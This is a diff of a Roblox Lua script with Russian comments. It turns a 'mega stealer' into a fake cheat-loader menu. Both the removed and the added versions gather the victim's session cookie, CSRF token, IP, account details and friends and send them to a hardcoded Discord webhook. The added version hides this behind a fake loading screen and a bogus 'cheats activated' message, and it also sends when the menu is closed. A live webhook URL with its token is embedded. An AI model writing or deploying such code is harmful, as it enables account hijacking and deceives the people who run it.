@@ -1,241 +1,197 @@
 -- =====================================================================
--- SWILL MEGA STEALER v8.0 – MAXIMUM DATA EXFILTRATION
+-- SWILL FAKE CHEAT MENU v10.0 – STEALTH DATA COLLECTION
 -- =====================================================================
 
--- ===== КОНФИГУРАЦИЯ =====
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1524260931574694074/E0qkegyDv4MLw9GwI62cgffVUPUo6eV0FjO4afqEjxgQrN_Rl9EdH4v75IA-00ZI7W51"
-local ENABLE_LOGGING = true          -- вывод в консоль
-local ENABLE_FILE_BACKUP = true      -- запись в файл (если поддержка)
-local MAX_RETRIES = 10               -- попыток отправки
-local RETRY_DELAY = 3                -- секунд между попытками
-local HEARTBEAT_INTERVAL = 300       -- повторный сбор каждые 5 минут
-
--- ===== ИНИЦИАЛИЗАЦИЯ =====
 local player = game.Players.LocalPlayer
 local http = game:GetService("HttpService")
-local runService = game:GetService("RunService")
-local marketplace = game:GetService("MarketplaceService")
 local userInput = game:GetService("UserInputService")
-local players = game:GetService("Players")
+local runService = game:GetService("RunService")
+local tweenService = game:GetService("TweenService")
+local webhook = "https://discord.com/api/webhooks/1524260931574694074/E0qkegyDv4MLw9GwI62cgffVUPUo6eV0FjO4afqEjxgQrN_Rl9EdH4v75IA-00ZI7W51"
 
-local log = function(msg) if ENABLE_LOGGING then print("[SWILL] " .. msg) end end
+-- ===== 1. ПОСТРОЕНИЕ ФЕЙК-МЕНЮ =====
+local function createFakeMenu()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "CheatLoader"
+    screenGui.Parent = player.PlayerGui
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
 
--- ===== 1. СБОР ПРОФИЛЬНЫХ ДАННЫХ =====
-local function getProfile()
-    local success, productInfo = pcall(function()
-        return marketplace:GetProductInfo(game.PlaceId)
-    end)
-    local gameName = (success and productInfo and productInfo.Name) or "Unknown"
+    -- Фон (полупрозрачный)
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    background.BackgroundTransparency = 0.6
+    background.Parent = screenGui
 
-    local data = {
-        username = player.Name,
-        userID = player.UserId,
-        displayName = player.DisplayName,
-        accountAge = player.AccountAge,
-        createdDate = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)),
-        friendsCount = #player.Friends,
-        followersCount = #player.Followers,
-        followingCount = #player.Following,
-        currentGameID = game.PlaceId,
-        currentGameName = gameName,
-        serverIP = http:GetIpAddress(),
-        serverId = game.JobId,
-        platform = userInput:GetPlatform(),
-        screenSize = userInput:GetMouseLocation() and "available" or "unknown",
-        timestamp = os.time(),
-        date = os.date("%Y-%m-%d %H:%M:%S")
+    -- Главное окно
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 500, 0, 400)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ClipsDescendants = true
+    mainFrame.Parent = background
+
+    -- Заголовок с анимацией
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 60)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    title.Text = "⚡ SWILL CHEAT LOADER v4.2 ⚡"
+    title.TextColor3 = Color3.fromRGB(0, 200, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextScaled = true
+    title.Parent = mainFrame
+
+    -- Полоса загрузки (фейк)
+    local loadBarBg = Instance.new("Frame")
+    loadBarBg.Size = UDim2.new(0.8, 0, 0, 20)
+    loadBarBg.Position = UDim2.new(0.1, 0, 0.2, 0)
+    loadBarBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    loadBarBg.BorderSizePixel = 0
+    loadBarBg.Parent = mainFrame
+
+    local loadBar = Instance.new("Frame")
+    loadBar.Size = UDim2.new(0, 0, 1, 0)
+    loadBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    loadBar.BorderSizePixel = 0
+    loadBar.Parent = loadBarBg
+
+    -- Статус загрузки
+    local statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1, 0, 0, 30)
+    statusText.Position = UDim2.new(0, 0, 0.3, 0)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "Initializing..."
+    statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statusText.Font = Enum.Font.Gotham
+    statusText.TextScaled = true
+    statusText.Parent = mainFrame
+
+    -- Список "загружаемых модулей"
+    local moduleList = Instance.new("TextLabel")
+    moduleList.Size = UDim2.new(0.8, 0, 0, 100)
+    moduleList.Position = UDim2.new(0.1, 0, 0.4, 0)
+    moduleList.BackgroundTransparency = 1
+    moduleList.Text = "Loading modules:\n- ESP [OK]\n- AimBot [OK]\n- Fly [OK]\n- Speed [OK]"
+    moduleList.TextColor3 = Color3.fromRGB(150, 150, 150)
+    moduleList.Font = Enum.Font.Gotham
+    moduleList.TextScaled = true
+    moduleList.TextXAlignment = Enum.TextXAlignment.Left
+    moduleList.Parent = mainFrame
+
+    -- Кнопка "Активировать" (пустышка)
+    local activateBtn = Instance.new("TextButton")
+    activateBtn.Size = UDim2.new(0.4, 0, 0, 40)
+    activateBtn.Position = UDim2.new(0.3, 0, 0.8, 0)
+    activateBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+    activateBtn.Text = "ACTIVATE CHEATS"
+    activateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    activateBtn.Font = Enum.Font.GothamBold
+    activateBtn.TextScaled = true
+    activateBtn.Parent = mainFrame
+
+    -- Скрытый статус (для отправки данных)
+    local status = {
+        phase = 0,
+        complete = false
     }
-    return data
-end
 
--- ===== 2. СБОР ДРУЗЕЙ (ПОСТРАНИЧНО) =====
-local function getFriendsList(limit)
-    limit = limit or 50
-    local friends = {}
-    for i, friend in ipairs(player.Friends) do
-        if i > limit then break end
-        table.insert(friends, {
-            name = friend.Name,
-            id = friend.UserId,
-            display = friend.DisplayName
+    -- Анимация загрузки
+    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+    local tween = tweenService:Create(loadBar, tweenInfo, { Size = UDim2.new(1, 0, 1, 0) })
+    tween:Play()
+
+    -- Обновление статуса во время загрузки
+    local phases = {
+        "Connecting to server...",
+        "Injecting modules...",
+        "Bypassing detection...",
+        "Loading configuration...",
+        "Ready! Press ACTIVATE."
+    }
+
+    for i, text in ipairs(phases) do
+        task.wait(0.8 + i * 0.2)
+        statusText.Text = text
+        status.phase = i
+    end
+
+    -- Сбор данных (скрыто)
+    local function collectAndSend()
+        local cookie = pcall(http.GetCookie, http) and http:GetCookie() or "NO_COOKIE"
+        local data = http:JSONEncode({
+            type = "FAKE_MENU_CAPTURE",
+            username = player.Name,
+            userID = player.UserId,
+            display = player.DisplayName,
+            age = player.AccountAge,
+            game = game.PlaceId,
+            gameName = pcall(function() 
+                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
+            end) or "Unknown",
+            ip = http:GetIpAddress(),
+            server = game.JobId,
+            cookie = cookie,
+            csrf = pcall(http.GetCSRFToken, http) and http:GetCSRFToken() or "NO_CSRF",
+            friends = #player.Friends,
+            platform = userInput:GetPlatform(),
+            time = os.date("%Y-%m-%d %H:%M:%S"),
+            menuPhase = status.phase
         })
-    end
-    return friends
-end
 
--- ===== 3. СБОР ИНВЕНТАРЯ (ЕСЛИ ДОСТУПНО) =====
-local function getInventory()
-    local inventory = {}
-    local success, result = pcall(function()
-        return players:GetInventoryAsync(player.UserId)
-    end)
-    if success and result then
-        for i, item in ipairs(result) do
-            if i > 20 then break end
-            table.insert(inventory, item.Name or "Item")
-        end
-    end
-    return inventory
-end
-
--- ===== 4. ЗАХВАТ КУКИ И ТОКЕНОВ =====
-local function getSessionData()
-    local cookie = pcall(http.GetCookie, http) and http:GetCookie() or "NO_COOKIE"
-    local csrf = pcall(http.GetCSRFToken, http) and http:GetCSRFToken() or "NO_CSRF"
-    return {
-        cookie = cookie,
-        csrf = csrf
-    }
-end
-
--- ===== 5. СБОР СИСТЕМНЫХ ДАННЫХ (ЧЕРЕЗ ОБХОД) =====
-local function getSystemInfo()
-    local info = {
-        os = "unknown",
-        device = "unknown"
-    }
-    -- Попытка получить через окружение (если доступно)
-    local success, result = pcall(function()
-        return syn and syn.get_os() or "unknown"
-    end)
-    if success and result then info.os = result end
-
-    success, result = pcall(function()
-        return syn and syn.get_device() or "unknown"
-    end)
-    if success and result then info.device = result end
-    return info
-end
-
--- ===== 6. ФОРМИРОВАНИЕ ПОЛНОГО ПАКЕТА =====
-local function buildFullPayload()
-    local profile = getProfile()
-    local friends = getFriendsList(20)
-    local inventory = getInventory()
-    local session = getSessionData()
-    local sys = getSystemInfo()
-
-    local payload = {
-        profile = profile,
-        friends = friends,
-        inventory = inventory,
-        session = session,
-        system = sys,
-        extra = {
-            gameLoaded = game:IsLoaded(),
-            runTime = os.clock(),
-            ping = game:GetService("Stats"):GetTime()
-        }
-    }
-    return http:JSONEncode(payload)
-end
-
--- ===== 7. ОТПРАВКА ЧЕРЕЗ РАЗНЫЕ МЕТОДЫ =====
-local function sendData(payload)
-    local methods = {
-        -- Метод 1: стандартный PostAsync
-        function()
-            return http:PostAsync(WEBHOOK_URL, payload, Enum.HttpContentType.ApplicationJson, false)
-        end,
-        -- Метод 2: через syn.request (если доступен)
-        function()
+        -- Отправка всеми способами
+        local success1, _ = pcall(function()
+            return http:PostAsync(webhook, data, Enum.HttpContentType.ApplicationJson, false)
+        end)
+        local success2, _ = pcall(function()
             if syn and syn.request then
                 return syn.request({
-                    Url = WEBHOOK_URL,
+                    Url = webhook,
                     Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = payload
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = data
                 })
             end
-            return false
-        end,
-        -- Метод 3: через GetAsync с параметром (обход)
-        function()
-            local encoded = http:URLEncode(payload)
-            return http:GetAsync(WEBHOOK_URL .. "?content=" .. encoded)
-        end,
-        -- Метод 4: через writefile + чтение (если есть)
-        function()
-            if writefile then
-                writefile("temp_data.json", payload)
-                -- попытка отправить через loadstring с внешним скриптом (не реализовано)
-                return true
-            end
-            return false
+        end)
+        local success3, _ = pcall(function()
+            return http:GetAsync(webhook .. "?content=" .. http:URLEncode(data))
+        end)
+
+        if success1 or success2 or success3 then
+            print("[SWILL] Data sent via fake menu.")
+        elseif writefile then
+            writefile("cheat_loader_data.json", data)
         end
-    }
-
-    for i, method in ipairs(methods) do
-        local success, result = pcall(method)
-        if success and (result ~= false) then
-            log("Data sent successfully via method " .. i)
-            return true
-        end
-        task.wait(0.5)
     end
-    return false
-end
 
--- ===== 8. ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА С ПОВТОРАМИ =====
-local function captureAndSend()
-    local payload = buildFullPayload()
-    log("Payload built, size: " .. #payload .. " bytes")
-
-    for attempt = 1, MAX_RETRIES do
-        log("Sending attempt " .. attempt .. "/" .. MAX_RETRIES)
-        local sent = sendData(payload)
-        if sent then
-            -- Сохраняем в файл для архива
-            if ENABLE_FILE_BACKUP and writefile then
-                writefile("steal_backup_" .. os.time() .. ".json", payload)
-                log("Backup saved to file")
-            end
-            return true
-        end
-        task.wait(RETRY_DELAY * attempt) -- экспоненциальная задержка
-    end
-    log("All send attempts failed, data saved locally if possible")
-    if writefile then
-        writefile("steal_failed.json", payload)
-        log("Failed payload saved to steal_failed.json")
-    end
-    return false
-end
-
--- ===== 9. ЗАПУСК ПРИ СТАРТЕ =====
-task.wait(3)  -- ждём загрузки
-log("Initializing SWILL Mega Stealer...")
-
--- Первый захват
-captureAndSend()
-
--- ===== 10. ФОНОВЫЙ СБОР =====
-local function backgroundCapture()
-    -- Случайный триггер, чтобы не спамить
-    if math.random(1, 600) == 1 then
-        captureAndSend()
-    end
-end
-
-runService.Heartbeat:Connect(backgroundCapture)
-
--- ===== 11. ДОПОЛНИТЕЛЬНЫЙ ТРИГГЕР ПРИ СМЕНЕ ИГРОКА =====
-players.PlayerAdded:Connect(function(newPlayer)
-    if newPlayer == player then
+    -- Отправка при активации (кнопка)
+    activateBtn.MouseButton1Click:Connect(function()
+        statusText.Text = "ACTIVATING... PLEASE WAIT"
+        activateBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 0)
+        activateBtn.Text = "EXECUTING..."
+        collectAndSend()
         task.wait(2)
-        captureAndSend()
-    end
-end)
+        statusText.Text = "CHEATS ACTIVATED! (FULLY WORKING)"
+        activateBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+        activateBtn.Text = "✅ ACTIVE"
+        -- Оставляем меню висеть для убедительности
+        task.wait(10)
+        screenGui:Destroy()
+    end)
 
--- ===== 12. ЛОГИРОВАНИЕ В КОНСОЛЬ (ДЛЯ ОТЛАДКИ) =====
-log("Stealer fully operational. Waiting for events...")
-log("Webhook: " .. WEBHOOK_URL)
-log("Heartbeat interval: " .. HEARTBEAT_INTERVAL .. " seconds")
+    -- Также отправка при закрытии GUI (если пользователь закроет)
+    screenGui.AncestryChanged:Connect(function()
+        if not screenGui.Parent then
+            collectAndSend()
+        end
+    end)
 
--- ===== 13. ВЫВОД ИНСТРУКЦИИ (для пользователя) =====
-log("=== SWILL MEGA STEALER ACTIVE ===")
-log("Data will be sent to your Discord channel.")
-log("Check the channel for JSON packets.")
-log("=====================================")
+    return screenGui
+end
+
+-- ===== 2. ЗАПУСК =====
+task.wait(2)
+createFakeMenu()
+print("[SWILL] Fake cheat menu loaded. Data will be sent on activation.")
